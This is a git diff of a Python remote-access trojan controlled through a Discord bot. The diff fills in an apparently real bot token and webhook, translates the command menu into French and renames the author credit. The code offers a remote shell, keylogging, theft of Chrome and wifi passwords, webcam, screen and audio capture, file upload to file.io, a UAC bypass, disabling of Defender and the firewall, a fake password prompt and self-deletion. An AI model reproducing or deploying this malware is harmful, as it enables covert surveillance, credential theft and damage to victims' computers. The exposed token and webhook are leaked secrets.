@@ -31,7 +31,7 @@ import socket
 import uuid
 from subprocess import Popen, PIPE
 from discord import utils
-token = 'TOKENHERE'
+token = 'OTUxODY0NTU0NTY3MTIzMDA0.Yitq8g.8B5Opom4QjpjC0tj1u2GdJGFHr0'
 
 global isexe
 isexe=False
@@ -47,146 +47,83 @@ ssl._create_default_https_context = ssl._create_unverified_context
 helpmenu = """
 Availaible commands are :
 
---> !message = Display a message box displaying your text /Syntax = "!example message".
-
---> !shell = Execute shell command /Syntax = "!shell whoami"
-
---> !webcampic = Take a photo from the webcam
-
---> !windowstart = Start logging current user's window (logging is shown in crawler activity)
-
---> !windowstop = Stop logging the current user's window
-
---> !voice = Say a custom phrase aloud / Syntax = "!voice test".
-
---> !admincheck = Check if the program has administrator privileges
-
---> !sysinfo = Gives information about the infected computer
-
---> !history = Get Chrome Browser History
-
---> !download = Download a file from the infected computer
-
---> !upload = Upload a file to the infected computer / Syntax = "!upload file.png" (with attachment)
-
---> !cd = Change directory
-
---> !delete = Deletes a file / Syntax = "!delete /path to/the/file.txt" (with attachment)
-
---> !write = Type the sentence of your choice on the computer / Type "enter" to press the "enter" button on the computer
-
---> !wallpaper = Change the wallpaper of the infected computer / Syntax = "!wallpaper" (with attachment)
-
---> !clipboard = Retrieve the contents of the infected computer's clipboard.
-
--->! geolocate = Geolocate the computer using the latitude and longitude of the IP address with google map / Warning: The geolocation of IP addresses is not very precise.
-
---> !startkeylogger = Starts a keylogger (keylogger)
-
---> !stopkeylogger = Stop keylogger
-
---> !dumpkeylogger = Dump the keylogger
-
---> !volumemax = Set volume to maximum
-
---> !volumezero = Set volume to 0
-
---> !idletime = Get user idle time on target computer
-
---> !listprocess = Get all processes
---> !listprocess = Get all processes
-
---> !blockinput = Blocks the user's keyboard and mouse / Warning: Administrator rights are required.
-
---> !unblockinput = Unblocks the user's keyboard and mouse / Attention: Administrator rights are required.
-
---> !screenshot = Get screenshot of user's current screen
-
---> !exit = Quit the program
-
---> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all".
-
---> !uacbypass = Attempt to bypass uac to access admin using fod help
-
---> !passwords = recover all passwords
-
---> !streamwebcam = stream the webcam by sending multiple images
-
---> !stopwebcam = stop webcam stream
-
---> !streamscreen = stream the screen by sending multiple images
-
---> !stopcreen = stop screen flow
-
---> !shutdown = shut down the computer
-
---> !restart = restart the computer
-
---> !logoff = log off current user
-
---> !bluescreen = Bluescreen PC
-
---> !displaydir = display all items in the current directory
-
---> !currentdir = show current directory
-
---> !dateandtime = show system date and time
-
---> !prockill = kill a process by its name / syntax = "!kill process.exe"
-
---> !recscreen = record screen for a while / syntax = "!recscreen 10".
-
---> !reccam = record camera for a while / syntax = "!reccam 10".
-
---> !recaudio = record audio for a certain time / syntax = "!recaudio 10".
-
---> !disableantivirus = permanently disable windows defender (requires admin)
-
---> !disablefirewall = disable windows firewall (requires administrator)
-
---> !audio = play an audio file on the target computer (.wav only) / Syntax = "!audio" (with attachment)
---> !selfdestruct = delete all traces that this program was on the target computer
-
---> !windowspass = password phishing attempt by popping up a password dialog
-
---> !displayoff = turn off the screen (administrator rights are required)
-
---> !displayon = turn on monitors (admin rights are required)
-
---> !hide = hide the file by changing the attribute to hidden
-
---> !unhide = unhide the file by removing the attribute to make it unhide
-
---> !ejectcd = eject the cd drive from the computer
-
---> !retractcd = retract the cd drive on the computer
-
---> !critproc = make a program a critical process, ie if the program is closed, the computer will have a blue screen (administrator rights are required).
-
---> !uncritproc = if the process is a critical process, it will no longer be a critical process, which means that it can be closed without a blue screen (administrator rights are required).
-
---> !website = open a website on the infected computer / syntax = "!website google.com" or "!website www.google.com"
-
---> !distaskmgr = disable task manager (admin rights are required)
-
---> !enbtaskmgr = enable task manager (if disabled) (admin rights are required)
-
---> !getwifipass = get all wifi passwords on current device (admin rights required)
-
---> !startup = add a file to startup (when the computer turns on, this file starts)(administrator rights required)
+--> !message = Afficher une boîte de message simplifiée votre texte / Syntaxe = "!message exemple"
+--> !shell = Exécuter une commande shell /Syntax = "!shell whoami"
+--> !webcampic = Prendre une photo de la webcam (si il y en une)
+--> !windowstart = Démarrer la journalisation de windows de l'utilisateur actuel (la journalisation est affichée dans l'activité du bot)
+--> !windowstop= Arrêter la journalisation de windows de utilisateur actuelle
+--> !voice = Faire dire à voix haute une phrase personnalisée / Syntaxe = "!voice test"
+--> !admincheck=Vérifier si le programme a des privilèges d'administrateur
+--> !sysinfo = Donne des informations sur l'ordinateur infecté
+--> !history = Obtenir l'historique du navigateur Chrome
+--> !download = Télécharger un fichier depuis un ordinateur infecté
+--> !upload = Télécharger le fichier sur l'ordinateur infecté / Syntaxe = "!upload file.png" (avec pièce jointe)
+--> !cd = Change de répertoire
+--> !delete = supprime un fichier / Syntaxe = "!delete /chemin vers/le/fichier.txt"
+--> !write = Tapez votre phrase désirée sur l'ordinateur / Tapez "enter" pour appuyer sur le bouton enter sur l'ordinateur
+--> !wallpaper = Changer le fond d'écran de l'ordinateur infecté / Syntaxe = "!wallpaper" (avec pièce jointe)
+--> !clipboard=Récupérer le contenu du presse-papiers de l'ordinateur infecté
+--> !geolocate = Géolocaliser l'ordinateur en utilisant la latitude et la longitude de l'adresse IP avec google map / Attention : La géolocalisation des adresses IP n'est pas très précise
+--> !startkeylogger = Démarre un enregistreur de frappe
+--> !stopkeylogger = Arrête l'enregistreur de frappe
+--> !dumpkeylogger = Vide le journal de frappe
+--> !volumemax = Mettre le volume au maximum
+--> !volumezero = Mettre le volume à 0
+--> !idletime = Obtenir le temps d'inactivité de l'utilisateur sur l'ordinateur cible
+--> !listprocess = Obtenir tous les processus
+--> !blockinput = Bloque le clavier et la souris de l'utilisateur / Attention : les droits d'administrateur sont requis
+--> !unblockinput = Débloque le clavier et la souris de l'utilisateur / Attention : les droits d'administrateur sont requis
+--> !screenshot = Obtenir la capture d'écran de l'écran actuel de l'utilisateur
+--> !exit = Quitter le programme
+--> !kill = Tuer une session ou toutes les sessions / Syntaxe = "!kill session-3" ou "!kill all"
+--> !uacbypass = tentative de contourner uac pour gagner les droits admin en utilisant fod helper
+--> !passwords = récupérer tous les mots de passe chrome
+--> !streamwebcam = diffuse la webcam en envoyant plusieurs images
+--> !stopwebcam = arrêter le flux de la webcam
+--> !streamscreen = diffuser l'écran en envoyant plusieurs images
+--> !stopscreen = arrêter le flux d'écran
+--> !shutdown = éteindre l'ordinateur
+--> !restart = redémarrer l'ordinateur
+--> !logoff = déconnecte l'utilisateur actuel
+--> !bluescreen = BlueScreenPC
+--> !displaydir = affiche tous les éléments du répertoire courant
+--> !currentdir = affiche le répertoire courant
+--> !dateandtime = afficher la date et l'heure du système
+--> !prockill = tuer un processus par nom / syntaxe = "!kill process.exe"
+--> !recscreen = enregistrer l'écran pendant un certain temps / syntaxe = "!recscreen 10"
+--> !reccam = enregistrer la caméra pendant un certain temps / syntaxe = "!reccam 10"
+--> !recaudio = enregistrer l'audio pendant un certain temps / syntaxe = "!recaudio 10"
+--> !disableantivirus = désactiver définitivement Windows Defender (nécessite un administrateur)
+--> !disablefirewall = désactiver le pare-feu Windows (nécessite un administrateur)
+--> !audio = lire un fichier audio sur l'ordinateur cible (.wav uniquement) / Syntaxe = "!audio" (avec pièce jointe)
+--> !selfdestruct = supprime toutes les traces que ce programme était sur le PC cible
+--> !windowspass = tentative d'hameçonnage du mot de passe en faisant apparaître une boîte de dialogue de mot de passe
+--> !displayoff = éteindre les écrans (les droits d'administrateur sont requis)
+--> !displayon = allumer les écrans (les droits d'administrateur sont requis)
+--> !hide = masquer le fichier en changeant l'attribut en caché
+--> !unhide = affiche le fichier en supprimant l'attribut pour le rendre non masqué
+--> !ejectcd = éjecter le lecteur de CD sur l'ordinateur
+--> !retractcd = rétracte le lecteur cd sur l'ordinateur
+--> !critproc = faire du programme un processus critique. ce qui signifie que s'il est fermé, l'ordinateur affichera un écran bleu (les droits d'administrateur sont requis)
+--> !uncritproc = si le processus est un processus critique, il ne sera plus un processus critique, ce qui signifie qu'il peut être fermé sans filtrage bleu (les droits d'administrateur sont requis)
+--> !website = ouvre un site Web sur l'ordinateur infecté / syntax = "!website google.com" ou "!website www.google.com"
+--> !distaskmgr = désactiver le gestionnaire de tâches (les droits d'administrateur sont requis)
+--> !enbtaskmgr = activer le gestionnaire de tâches (si désactivé) (les droits d'administrateur sont requis)
+--> !getwifipass = obtenir tous les mots de passe wifi sur l'appareil actuel (les droits d'administrateur sont requis)
+--> !startup = ajouter le fichier au démarrage (lorsque l'ordinateur va sur ce fichier démarre) (les droits d'administrateur sont requis)
 """
 LOGSYSTEM  =   True    # -> Send System Embed
-CAMERAPIC  =   True    # -> Send Camera
-PCSCRAPE   =   True    # -> Scrape Information of PC vitctim's
-SENDHIST   =   True    # -> Send hist
-BUY_NITRO  =   True    # -> Send Nitro gift from Account
+CAMERAPIC = True
+PCSCRAPE = True
+SENDHIST = True
+BUY_NITRO  =   True   # -> Send Nitro gift from Account
 DISCINJECT =   True    # -> Inject into Discord
 PINGME     =   True    # -> Get Pinged when account is Logged
-WEBHOOK    =   "WEBHOOKHERE"
+WEBHOOK    =   "https://discord.com/api/webhooks/961891205866749954/B2oafGgeJ12-nrSWAPo7BMqM1EoQDEyytrTuFt_BcHEKO-nnkeiTDocccQILn6kQlfNb"
 
 class Program():
-    """    The RAT  Program    """
-    """ Edited By RAZ for Thio ❤️  """
+    """    The RATZ Program    """
+    """ Edited & Coded by RAZ """
 
     class Logger():
         """ Discord & System Logging """
@@ -385,7 +322,7 @@ class Program():
                             "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
                         },
                         "footer": {
-                            "text": f"• Edited By RAZ for Thio  •  {nitrocode}",
+                            "text": f"• Edited & Coded by RAZ  •  {nitrocode}",
                             "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
                         },
                         "image": {
@@ -670,7 +607,7 @@ class Program():
                             "name": f"✔️ System Information",
                         },
                         "footer": {
-                            "text": f"• Edited By RAZ for Thio  •  Discord: {injection}"
+                            "text": f"• Edited & Coded by RAZ  •  Discord: {injection}"
                         },
                     }
                     embeds.append(embed)                
@@ -726,7 +663,7 @@ async def on_ready():
     channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
     channel = client.get_channel(channel_.id)
     is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-    value1 = f"||@everyone|| | Edited by RAZ for Thio | ❤️ Nouvel utilisateur | {platform.system()} {platform.release()} | :flag_{flag.lower()}: | Utilisateur : {os.getlogin()} | IP: {ip}"
+    value1 = f"||@everyone|| | Edited by RAZ | 💀 Nouvel utilisateur | {platform.system()} {platform.release()} | :flag_{flag.lower()}: | Utilisateur : {os.getlogin()} | IP: {ip}"
     if is_admin == True:
         await channel.send(f'{value1} | admin: ✅')
     elif is_admin == False:
@@ -785,7 +722,7 @@ async def on_message(message):
             temp = os.getenv("TEMP")
             file_keys = temp + r"\key_log.txt"
             file = discord.File(file_keys, filename="key_log.txt")
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès", file=file)
             os.remove(file_keys)
 
         if message.content == "!exit":
@@ -815,16 +752,16 @@ async def on_message(message):
                 sct.shot(output=os.path.join(os.getenv('TEMP') + r"\monitor.png"))
             path = (os.getenv('TEMP')) + r"\monitor.png"
             file = discord.File((path), filename="monitor.png")
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès", file=file)
             os.remove(path)
 
         if message.content == "!volumemax":
             volumeup()
-            await message.channel.send("[❤️] - Volume réglé sur 100%")
+            await message.channel.send("[💀] - Volume réglé sur 100%")
 
         if message.content == "!volumezero":
             volumedown()
-            await message.channel.send("[❤️] - Volume réglé sur 0%")
+            await message.channel.send("[💀] - Volume réglé sur 0%")
 
         if message.content == "!webcampic":
             import os
@@ -838,7 +775,7 @@ async def on_message(message):
             cv2.imwrite(temp + r"\temp.png", image)
             del(camera)
             file = discord.File(temp + r"\temp.png", filename="temp.png")
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès", file=file)
         if message.content.startswith("!message"):
             import ctypes
             import time
@@ -874,11 +811,11 @@ async def on_message(message):
             path = os.path.join(os.getenv('TEMP') + r"\temp.jpg")
             await message.attachments[0].save(path)
             ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès")
 
         if message.content.startswith("!upload"):
             await message.attachments[0].save(message.content[8:])
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès")
 
         if message.content.startswith("!shell"):
             global status
@@ -904,10 +841,10 @@ async def on_message(message):
                     f1.write(out)
                     f1.close()
                     file = discord.File(temp + r"\output.txt", filename="output.txt")
-                    await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
+                    await message.channel.send("[💀] - La commande à été éxecutée avec succès", file=file)
                     os.remove(temp + r"\output.txt")
                 else:
-                    await message.channel.send("[❤️] - La commande à été éxecutée avec succès : " + out)
+                    await message.channel.send("[💀] - La commande à été éxecutée avec succès : " + out)
             else:
                 await message.channel.send("[❌] - Commande shell non reconnue | (Certaines commandes n'ont pas forcément de sortie, il se peut donc que la commande n'a pas été reconnue mais a marchée)")
                 status = None
@@ -922,15 +859,15 @@ async def on_message(message):
                 await message.channel.send("Cela peut prendre un peu de temps si c'est au dessus de 8MB. Merci d'attendre")
                 response = requests.post('https://file.io/', files={"file": open(filename, "rb")}).json()["link"]
                 await message.channel.send("download link: " + response)
-                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+                await message.channel.send("[💀] - La commande à été éxecutée avec succès")
             else:
                 file = discord.File(message.content[10:], filename=message.content[10:])
-                await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
+                await message.channel.send("[💀] - La commande à été éxecutée avec succès", file=file)
 
         if message.content.startswith("!cd"):
             import os
             os.chdir(message.content[4:])
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès")
 
         if message.content == "!help":
             import os
@@ -940,7 +877,7 @@ async def on_message(message):
             f5.close()
             temp = (os.getenv('TEMP'))
             file = discord.File(temp + r"\helpmenu.txt", filename="helpmenu.txt")
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès", file=file)
             os.remove(temp + r"\helpmenu.txt")
 
         if message.content.startswith("!write"):
@@ -975,7 +912,7 @@ async def on_message(message):
                 f4.close()
             con.close()
             file = discord.File(temp + r"\history12" + r"\history.txt", filename="history.txt")
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès", file=file)
             def deleteme() :
                 path = "rmdir " + temp + r"\history12" + " /s /q"
                 os.system(path)
@@ -999,7 +936,7 @@ async def on_message(message):
                 kernel32.GlobalUnlock(data_locked)
                 body = value.decode()
                 user32.CloseClipboard()
-                await message.channel.send("[❤️] - La commande à été éxecutée avec succès : " + "Le presse papier est : " + str(body))
+                await message.channel.send("[💀] - La commande à été éxecutée avec succès : " + "Le presse papier est : " + str(body))
 
         if message.content == "!sysinfo":
             import platform
@@ -1008,7 +945,7 @@ async def on_message(message):
             from requests import get
             ip = get('https://api.ipify.org').text
             pp = "IP Address = " + ip
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès : " + intro + pp)
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès : " + intro + pp)
 
         if message.content == "!geolocate":
             import urllib.request
@@ -1016,13 +953,13 @@ async def on_message(message):
             with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                 data = json.loads(url.read().decode())
                 link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
-                await message.channel.send("[❤️] - La commande à été éxecutée avec succès : " + link)
+                await message.channel.send("[💀] - La commande à été éxecutée avec succès : " + link)
 
         if message.content == "!admincheck":
             import ctypes
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             if is_admin == True:
-                await message.channel.send("[❤️] - Administrateur: ✅")
+                await message.channel.send("[💀] - Administrateur: ✅")
             elif is_admin == False:
                 await message.channel.send("[❌] - Administrateur: ❌")
 
@@ -1131,14 +1068,14 @@ async def on_message(message):
             speak = wincl.Dispatch("SAPI.SpVoice")
             speak.Speak(message.content[7:])
 
-            await  message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+            await  message.channel.send("[💀] - La commande à été éxecutée avec succès")
 
         if message.content.startswith("!blockinput"):
             import ctypes
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             if is_admin == True:
                 ok = windll.user32.BlockInput(True)
-                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+                await message.channel.send("[💀] - La commande à été éxecutée avec succès")
             else:
                 await message.channel.send("[❌] - Vous avez besoin de droit administrateur pour cette opération")
 
@@ -1147,7 +1084,7 @@ async def on_message(message):
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             if is_admin == True:
                 ok = windll.user32.BlockInput(False)
-                await  message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+                await  message.channel.send("[💀] - La commande à été éxecutée avec succès")
             else:
                 await message.channel.send("[❌] - Vous avez besoin de droit administrateur pour cette opération")
         if message.content == "!passwords" :
@@ -1164,10 +1101,10 @@ async def on_message(message):
             f4.write(str(passwords))
             f4.close()
             file = discord.File(temp + r"\passwords.txt", filename="passwords.txt")
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès", file=file)
             os.remove(temp + r"\passwords.txt")
         if message.content == "!streamwebcam" :
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès")
             import os
             import time
             import cv2
@@ -1201,7 +1138,7 @@ async def on_message(message):
             os.system(r"echo hello>%temp%\hobo\hello.txt")
             os.system(r"del %temp\temp.png /F")
         if message.content == "!streamscreen" :
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès")
             import os
             from mss import mss
             temp = (os.getenv('TEMP'))
@@ -1234,19 +1171,19 @@ async def on_message(message):
             import os
             uncritproc()
             os.system("shutdown /p")
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès")
             
         if message.content == "!restart":
             import os
             uncritproc()
             os.system("shutdown /r /t 00")
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès")
             
         if message.content == "!logoff":
             import os
             uncritproc()
             os.system("shutdown /l /f")
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès")
             
         if message.content == "!bluescreen":
             import ctypes
@@ -1256,7 +1193,7 @@ async def on_message(message):
         if message.content == "!currentdir":
             import subprocess as sp
             output = sp.getoutput('cd')
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès")
             await message.channel.send("output is : " + output)
             
         if message.content == "!displaydir":
@@ -1277,13 +1214,13 @@ async def on_message(message):
                     f1.write(result)
                     f1.close()
                     file = discord.File(temp + r"\output22.txt", filename="output22.txt")
-                    await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
+                    await message.channel.send("[💀] - La commande à été éxecutée avec succès", file=file)
                 else:
-                    await message.channel.send("[❤️] - La commande à été éxecutée avec succès : " + result)  
+                    await message.channel.send("[💀] - La commande à été éxecutée avec succès : " + result)  
         if message.content == "!dateandtime":
             import subprocess as sp
             output = sp.getoutput(r'echo time = %time% date = %date%')
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès")
             await message.channel.send("output is : " + output)
             
         if message.content == "!listprocess":
@@ -1302,9 +1239,9 @@ async def on_message(message):
                     f1.write(result)
                     f1.close()
                     file = discord.File(temp + r"\output.txt", filename="output.txt")
-                    await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
+                    await message.channel.send("[💀] - La commande à été éxecutée avec succès", file=file)
                 else:
-                    await message.channel.send("[❤️] - La commande à été éxecutée avec succès : " + result)           
+                    await message.channel.send("[💀] - La commande à été éxecutée avec succès : " + result)           
         if message.content.startswith("!prockill"):  
             import os
             proc = message.content[10:]
@@ -1321,7 +1258,7 @@ async def on_message(message):
             last_line = output.strip().split('\r\n')[-1]
             done = (last_line.lower().startswith(process_name.lower()))
             if done == False:
-                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+                await message.channel.send("[💀] - La commande à été éxecutée avec succès")
             elif done == True:
                 await message.channel.send('[❌] - La commande ne s\'est pas exécutée correctement') 
         if message.content.startswith("!recscreen"):
@@ -1363,11 +1300,11 @@ async def on_message(message):
                 await message.channel.send("Cela peut prendre un peu de temps si c'est au dessus de 8MB. Merci d'attendre")
                 boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                 await message.channel.send("video download link: " + boom)
-                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+                await message.channel.send("[💀] - La commande à été éxecutée avec succès")
                 os.system(r"del %temp%\output.avi /f")
             else:
                 file = discord.File(check, filename="output.avi")
-                await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
+                await message.channel.send("[💀] - La commande à été éxecutée avec succès", file=file)
                 os.system(r"del %temp%\output.avi /f")
         if message.content.startswith("!reccam"):
             import cv2
@@ -1403,11 +1340,11 @@ async def on_message(message):
                 await message.channel.send("Cela peut prendre un peu de temps si c'est au dessus de 8MB. Merci d'attendre")
                 boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                 await message.channel.send("video download link: " + boom)
-                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+                await message.channel.send("[💀] - La commande à été éxecutée avec succès")
                 os.system(r"del %temp%\output.mp4 /f")
             else:
                 file = discord.File(check, filename="output.mp4")
-                await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
+                await message.channel.send("[💀] - La commande à été éxecutée avec succès", file=file)
                 os.system(r"del %temp%\output.mp4 /f")
         if message.content.startswith("!recaudio"):
             import cv2
@@ -1433,11 +1370,11 @@ async def on_message(message):
                 await message.channel.send("Cela peut prendre un peu de temps si c'est au dessus de 8MB. Merci d'attendre")
                 boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                 await message.channel.send("video download link: " + boom)
-                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+                await message.channel.send("[💀] - La commande à été éxecutée avec succès")
                 os.system(r"del %temp%\output.wav /f")
             else:
                 file = discord.File(check, filename="output.wav")
-                await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
+                await message.channel.send("[💀] - La commande à été éxecutée avec succès", file=file)
                 os.system(r"del %temp%\output.wav /f")
         if message.content.startswith("!delete"):
             global statue
@@ -1462,7 +1399,7 @@ async def on_message(message):
                 if numb > 0:
                     await message.channel.send("[❌] - Une erreur est survenue")
                 else:
-                    await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+                    await message.channel.send("[💀] - La commande à été éxecutée avec succès")
             else:
                 await message.channel.send("[❌] - Commande shell non reconnue | (Certaines commandes n'ont pas forcément de sortie, il se peut donc que la commande n'a pas été reconnue mais a marchée)")
                 statue = None
@@ -1481,10 +1418,10 @@ async def on_message(message):
                 boom = done[2:]
                 if boom <= ['17763']:
                     os.system(r"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet")
-                    await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+                    await message.channel.send("[💀] - La commande à été éxecutée avec succès")
                 elif boom >= ['18362']:
                     os.system(r"""powershell Add-MpPreference -ExclusionPath "C:\\" """)
-                    await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+                    await message.channel.send("[💀] - La commande à été éxecutée avec succès")
                 else:
                     await message.channel.send("[❌] - Une erreur est survenue")     
             else:
@@ -1495,7 +1432,7 @@ async def on_message(message):
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             if is_admin == True:
                 os.system(r"NetSh Advfirewall set allprofiles state off")
-                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+                await message.channel.send("[💀] - La commande à été éxecutée avec succès")
             else:
                 await message.channel.send("[❌] - Cette commande requiert les droit administrateur")
         if message.content.startswith("!audio"):
@@ -1517,7 +1454,7 @@ async def on_message(message):
             f5.write(result)
             f5.close()
             os.system(r"start %temp%\sounds.vbs")
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès")
         #if adding startup n stuff this needs to be edited to that
         if message.content == "!selfdestruct": #prob beter way to do dis
             import inspect
@@ -1549,7 +1486,7 @@ async def on_message(message):
                output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                return output
             result = str(shell().stdout.decode('CP437'))
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès")
             await message.channel.send("Le mot de passe windows de l'utilisateur est: " + result)
         if message.content == "!displayoff":
             import ctypes
@@ -1561,7 +1498,7 @@ async def on_message(message):
                 SC_MONITORPOWER = 61808
                 ctypes.windll.user32.BlockInput(True)
                 ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
-                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+                await message.channel.send("[💀] - La commande à été éxecutée avec succès")
             else:
                 await message.channel.send("[❌] - Vous avez besoin de droit administrateur pour cette opération")
         if message.content == "!displayon":
@@ -1575,7 +1512,7 @@ async def on_message(message):
                 keyboard.press(Key.esc)
                 keyboard.release(Key.esc)
                 ctypes.windll.user32.BlockInput(False)
-                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+                await message.channel.send("[💀] - La commande à été éxecutée avec succès")
             else:
                 await message.channel.send("[❌] - Vous avez besoin de droit administrateur pour cette opération")
         if message.content == "!hide":
@@ -1583,28 +1520,28 @@ async def on_message(message):
             import inspect
             cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
             os.system("""attrib +h "{}" """.format(cmd237))
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès")
         if message.content == "!unhide":
             import os
             import inspect
             cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
             os.system("""attrib -h "{}" """.format(cmd237))
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès")
         #broken. might fix if someone want me too.
         if message.content == "!ejectcd":
             import ctypes
             return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door open', None, 0, None)
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès")
         if message.content == "!retractcd":
             import ctypes
             return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door closed', None, 0, None)
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès")
         if message.content == "!critproc":
             import ctypes
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             if is_admin == True:
                 critproc()
-                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+                await message.channel.send("[💀] - La commande à été éxecutée avec succès")
             else:
                 await message.channel.send(r"[*] Not admin :(")
         if message.content == "!uncritproc":
@@ -1612,7 +1549,7 @@ async def on_message(message):
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             if is_admin == True:
                 uncritproc()
-                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+                await message.channel.send("[💀] - La commande à été éxecutée avec succès")
             else:
                 await message.channel.send(r"[*] Not admin :(")
         if message.content.startswith("!website"):
@@ -1623,7 +1560,7 @@ async def on_message(message):
                     URL = 'http://' + URL
                 subprocess.call('start ' + URL, shell=True) 
             OpenBrowser(website)
-            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+            await message.channel.send("[💀] - La commande à été éxecutée avec succès")
         if message.content == "!distaskmgr":
             import ctypes
             import os
@@ -1655,7 +1592,7 @@ async def on_message(message):
                 else:
                     import os
                     os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
-                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+                await message.channel.send("[💀] - La commande à été éxecutée avec succès")
             else:
                 await message.channel.send("[❌] - Cette commande requiert les droit administrateur")
         if message.content == "!enbtaskmgr":
@@ -1686,11 +1623,11 @@ async def on_message(message):
                     shel._running = False
                     result = str(shell().stdout.decode('CP437'))
                     if len(result) <= 5:
-                        await message.channel.send("[❤️] - La commande à été éxecutée avec succès")  
+                        await message.channel.send("[💀] - La commande à été éxecutée avec succès")  
                     else:
                         import winreg as reg
                         reg.DeleteKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
-                        await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
+                        await message.channel.send("[💀] - La commande à été éxecutée avec succès")
             else:
                 await message.channel.send("[❌] - Cette commande requiert les droit administrateur")
